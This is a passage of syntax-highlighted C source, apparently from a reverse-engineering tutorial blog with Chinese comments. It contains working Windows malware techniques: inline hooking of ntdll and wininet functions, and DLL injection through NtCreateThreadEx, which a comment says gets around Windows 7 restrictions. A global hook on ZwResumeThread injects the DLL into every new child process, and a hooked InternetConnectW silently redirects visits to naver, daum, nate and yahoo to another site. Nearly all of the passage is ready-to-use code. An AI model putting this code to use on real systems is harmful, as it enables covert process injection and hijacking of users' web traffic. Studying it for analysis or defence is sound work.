<span class="built_in">DebugLog</span>(<span class="string">&quot;hook_by_code() : GetModuleHandle(\&quot;%s\&quot;) failed!!! [%d]\n&quot;</span>, szDllName, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	pFunc = (FARPROC)<span class="built_in">GetProcAddress</span>(hMod, szFuncName);</span><br><span class="line">    <span class="keyword">if</span>( pFunc == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;hook_by_code() : GetProcAddress(\&quot;%s\&quot;) failed!!! [%d]\n&quot;</span>, szFuncName, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	pByte = (PBYTE)pFunc;</span><br><span class="line">	<span class="keyword">if</span>( pByte[<span class="number">0</span>] == <span class="number">0xE9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;hook_by_code() : The API is hooked already!!!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( !<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;hook_by_code() : VirtualProtect(#1) failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(pOrgBytes, pFunc, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	dwAddress = (DWORD)pfnNew - (DWORD)pFunc - <span class="number">5</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;pBuf[<span class="number">1</span>], &amp;dwAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(pFunc, pBuf, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( !<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;hook_by_code() : VirtualProtect(#2) failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">unhook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FARPROC pFunc = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">	PBYTE pByte = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    hMod = <span class="built_in">GetModuleHandleA</span>(szDllName);</span><br><span class="line">    <span class="keyword">if</span>( hMod == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;unhook_by_code() : GetModuleHandle(\&quot;%s\&quot;) failed!!! [%d]\n&quot;</span>,</span><br><span class="line">                  szDllName, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	pFunc = (FARPROC)<span class="built_in">GetProcAddress</span>(hMod, szFuncName);</span><br><span class="line">    <span class="keyword">if</span>( pFunc == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;unhook_by_code() : GetProcAddress(\&quot;%s\&quot;) failed!!! [%d]\n&quot;</span>,</span><br><span class="line">                  szFuncName, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	pByte = (PBYTE)pFunc;</span><br><span class="line">	<span class="keyword">if</span>( pByte[<span class="number">0</span>] != <span class="number">0xE9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;unhook_by_code() : The API is unhooked already!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( !<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;unhook_by_code() : VirtualProtect(#1) failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(pFunc, pOrgBytes, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( !<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;unhook_by_code() : VirtualProtect(#2) failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断当前系统</span></span><br><span class="line"><span class="function">BOOL <span class="title">IsVistaLater</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    OSVERSIONINFO osvi;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;osvi, <span class="built_in">sizeof</span>(OSVERSIONINFO));</span><br><span class="line">    osvi.dwOSVersionInfoSize = <span class="built_in">sizeof</span>(OSVERSIONINFO);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetVersionEx</span>(&amp;osvi);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( osvi.dwMajorVersion &gt;= <span class="number">6</span> )</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI *PFNTCREATETHREADEX)</span></span></span><br><span class="line"><span class="function"><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE                 ThreadHandle,	</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK             DesiredAccess,	</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID                  ObjectAttributes,	</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE                  ProcessHandle,	</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE  lpStartAddress,	</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID                  lpParameter,	</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL	                CreateSuspended,	</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD                   dwStackSize,	</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD                   dw1, </span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD                   dw2, </span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID                  Unknown </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	在 Windows XP 中，CreateRemoteThread 函数是创建远程线程的主要方法，因为在该操作系统中，内核对于线程的安全监管比较宽松，没有对 CreateRemoteThread 函数的调用进行过多的安全限制，因此该函数可以比较方便地在其他进程中创建新线程。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	然而，在 Windows 7 中，由于操作系统内核的安全机制加强，为了防止恶意程序利用远程线程注入等手段进行攻击，操作系统加强了对线程创建的安全限制。在 Windows 7 及之后的版本中，CreateRemoteThread 函数被限制为只能在同一用户会话中的进程间进行创建远程线程，而不能在不同用户会话之间进行创建。这样一来，就大大降低了远程线程注入攻击的可能性。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	为了绕过这些安全限制，一些恶意程序使用了 NtCreateThreadEx 函数。该函数是一个系统调用函数，可以绕过一些操作系统内核的安全检查，因此可以在 Windows 7 中成功地创建远程线程。但是，由于 NtCreateThreadEx 函数是一个系统调用函数，需要使用底层的编程技巧来调用，因此使用起来比 CreateRemoteThread 函数更加困难。此外，由于该函数不被 Windows API 提供，因此可能会导致一些兼容性问题。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">MyCreateRemoteThread</span><span class="params">(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE      hThread = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC     pFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// win7 在 CreateRemoteThread 上还是与传统方法不太一样</span></span><br><span class="line">	<span class="comment">// 如果是win7，则使用NtCreateThreadEx</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">IsVistaLater</span>() )    <span class="comment">// Vista, 7, Server2008</span></span><br><span class="line">    &#123;</span><br><span class="line">        pFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>( pFunc == <span class="literal">NULL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DebugLog</span>(<span class="string">&quot;MyCreateRemoteThread() : GetProcAddress() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ((PFNTCREATETHREADEX)pFunc)(&amp;hThread,</span><br><span class="line">                                    <span class="number">0x1FFFFF</span>,</span><br><span class="line">                                    <span class="literal">NULL</span>,</span><br><span class="line">                                    hProcess,</span><br><span class="line">                                    pThreadProc,</span><br><span class="line">                                    pRemoteBuf,</span><br><span class="line">                                    FALSE,</span><br><span class="line">                                    <span class="literal">NULL</span>,</span><br><span class="line">                                    <span class="literal">NULL</span>,</span><br><span class="line">                                    <span class="literal">NULL</span>,</span><br><span class="line">                                    <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>( hThread == <span class="literal">NULL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DebugLog</span>(<span class="string">&quot;MyCreateRemoteThread() : NtCreateThreadEx() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                    <span class="comment">// 2000, XP, Server2003</span></span><br><span class="line">    &#123;</span><br><span class="line">        hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>( hThread == <span class="literal">NULL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DebugLog</span>(<span class="string">&quot;MyCreateRemoteThread() : CreateRemoteThread() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( WAIT_FAILED == <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;MyCreateRemoteThread() : WaitForSingleObject() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE                  hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE                  hThread = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID                  pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD                   dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">	LPTHREAD_START_ROUTINE  pThreadProc = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL                    bRet = FALSE;</span><br><span class="line">    HMODULE                 hMod = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( !(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;InjectDll() : OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">goto</span> INJECTDLL_EXIT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	pRemoteBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span>( pRemoteBuf == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;InjectDll() : VirtualAllocEx() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">goto</span> INJECTDLL_EXIT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( !<span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;InjectDll() : WriteProcessMemory() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">goto</span> INJECTDLL_EXIT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hMod = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>( hMod == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;InjectDll() : GetModuleHandle() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">goto</span> INJECTDLL_EXIT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>( pThreadProc == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;InjectDll() : GetProcAddress() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">goto</span> INJECTDLL_EXIT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">MyCreateRemoteThread</span>(hProcess, pThreadProc, pRemoteBuf) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;InjectDll() : MyCreateRemoteThread() failed!!!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> INJECTDLL_EXIT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bRet = TRUE;</span><br><span class="line"></span><br><span class="line">INJECTDLL_EXIT:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( pRemoteBuf )</span><br><span class="line">        <span class="built_in">VirtualFreeEx</span>(hProcess, pRemoteBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( hThread )</span><br><span class="line">	    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( hProcess )</span><br><span class="line">	    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	进行全局钩取</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">NewZwResumeThread</span><span class="params">(HANDLE ThreadHandle, PULONG SuspendCount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS status, statusThread;</span><br><span class="line">    FARPROC pFunc = <span class="literal">NULL</span>, pFuncThread = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwPID = <span class="number">0</span>;</span><br><span class="line">	<span class="type">static</span> DWORD dwPrevPID = <span class="number">0</span>;</span><br><span class="line">    THREAD_BASIC_INFORMATION tbi;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    TCHAR szModPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() : start!!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    hMod = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>( hMod == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() : GetModuleHandle() failed!!! [%d]\n&quot;</span>,</span><br><span class="line">                  <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 查询线程信息</span></span><br><span class="line">    <span class="comment">// call ntdll!ZwQueryInformationThread()</span></span><br><span class="line">    pFuncThread = <span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;ZwQueryInformationThread&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>( pFuncThread == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() : GetProcAddress() failed!!! [%d]\n&quot;</span>,</span><br><span class="line">                  <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    statusThread = ((PFZWQUERYINFORMATIONTHREAD)pFuncThread)(ThreadHandle, <span class="number">0</span>, &amp;tbi, <span class="built_in">sizeof</span>(tbi), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>( statusThread != STATUS_SUCCESS )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() : pFuncThread() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// dwPID为要唤醒的进程ID（子进程），GetCurrentProcessId则是当前创建子进程的进程的ID（父进程）。</span></span><br><span class="line">    dwPID = (DWORD)tbi.ClientId.UniqueProcess;</span><br><span class="line">    <span class="keyword">if</span> ( (dwPID != <span class="built_in">GetCurrentProcessId</span>()) &amp;&amp; (dwPID != dwPrevPID) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() =&gt; call InjectDll()\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        dwPrevPID = dwPID;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改 privilege</span></span><br><span class="line">       	<span class="keyword">if</span>( !<span class="built_in">SetPrivilege</span>(SE_DEBUG_NAME, TRUE) )</span><br><span class="line">            <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() : SetPrivilege() failed!!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 injection dll 路径</span></span><br><span class="line">        <span class="built_in">GetModuleFileName</span>(<span class="built_in">GetModuleHandle</span>(STR_MODULE_NAME), </span><br><span class="line">                          szModPath, </span><br><span class="line">                          MAX_PATH);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( !<span class="built_in">InjectDll</span>(dwPID, szModPath) )</span><br><span class="line">            <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() : InjectDll(%d) failed!!!\n&quot;</span>, dwPID);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// call ntdll!ZwResumeThread()</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">unhook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, g_pZWRT) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() : unhook_by_code() failed!!!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pFunc = <span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;ZwResumeThread&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>( pFunc == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() : GetProcAddress() failed!!! [%d]\n&quot;</span>,</span><br><span class="line">                  <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">goto</span> __NTRESUMETHREAD_END;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    status = ((PFZWRESUMETHREAD)pFunc)(ThreadHandle, SuspendCount);</span><br><span class="line">    <span class="keyword">if</span>( status != STATUS_SUCCESS )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() : pFunc() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">goto</span> __NTRESUMETHREAD_END;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">__NTRESUMETHREAD_END:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">hook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, (PROC)NewZwResumeThread, g_pZWRT) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() : hook_by_code() failed!!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DebugLog</span>(<span class="string">&quot;NewZwResumeThread() : end!!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	负责监视IE的连接地址，IE尝试连接到特定网站时，将其转到我们指定的网站。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">HINTERNET WINAPI <span class="title">NewInternetConnectW</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HINTERNET hInternet,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCWSTR lpszServerName,</span></span></span><br><span class="line"><span class="params"><span class="function">    INTERNET_PORT nServerPort,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpszUsername,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpszPassword,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwService,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD_PTR dwContext</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HINTERNET hInt = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC pFunc = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unhook</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">unhook_by_code</span>(<span class="string">&quot;wininet.dll&quot;</span>, <span class="string">&quot;InternetConnectW&quot;</span>, g_pICW) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewInternetConnectW() : unhook_by_code() failed!!!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// call original API</span></span><br><span class="line">    hMod = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;wininet.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>( hMod == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewInternetConnectW() : GetModuleHandle() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">goto</span> __INTERNETCONNECT_EXIT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pFunc = <span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;InternetConnectW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>( pFunc == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;NewInternetConnectW() : GetProcAddress() failed!!! [%d]\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">goto</span> __INTERNETCONNECT_EXIT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !_tcsicmp(lpszServerName, <span class="string">L&quot;www.naver.com&quot;</span>) ||</span><br><span class="line">        !_tcsicmp(lpszServerName, <span class="string">L&quot;www.daum.net&quot;</span>) ||</span><br><span class="line">        !_tcsicmp(lpszServerName, <span class="string">L&quot;www.nate.com&quot;</span>) || </span><br><span class="line">        !_tcsicmp(lpszServerName, <span class="string">L&quot;www.yahoo.com&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;[redirect] naver, daum, nate, yahoo =&gt; reversecore\n&quot;</span>);</span><br><span class="line">        hInt = ((PFINTERNETCONNECTW)pFunc)(hInternet,</span><br><span class="line">                                           <span class="string">L&quot;www.reversecore.com&quot;</span>,</span><br><span class="line">                                           nServerPort,</span><br><span class="line">                                           lpszUsername,</span><br><span class="line">                                           lpszPassword,</span><br><span class="line">                                           dwService,</span><br><span class="line">                                           dwFlags,</span><br><span class="line">                                           dwContext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;[no redirect]\n&quot;</span>);</span><br><span class="line">        hInt = ((PFINTERNETCONNECTW)pFunc)(hInternet,</span><br><span class="line">                                           lpszServerName,</span><br><span class="line">                                           nServerPort,</span><br><span class="line">                                           lpszUsername,</span><br><span class="line">                                           lpszPassword,</span><br><span class="line">                                           dwService,</span><br><span class="line">                                           dwFlags,</span><br><span class="line">                                           dwContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">__INTERNETCONNECT_EXIT:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hook</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">hook_by_code</span>(<span class="string">&quot;wininet.dll&quot;</span>, <span class="string">&quot;InternetConnectW&quot;</span>, 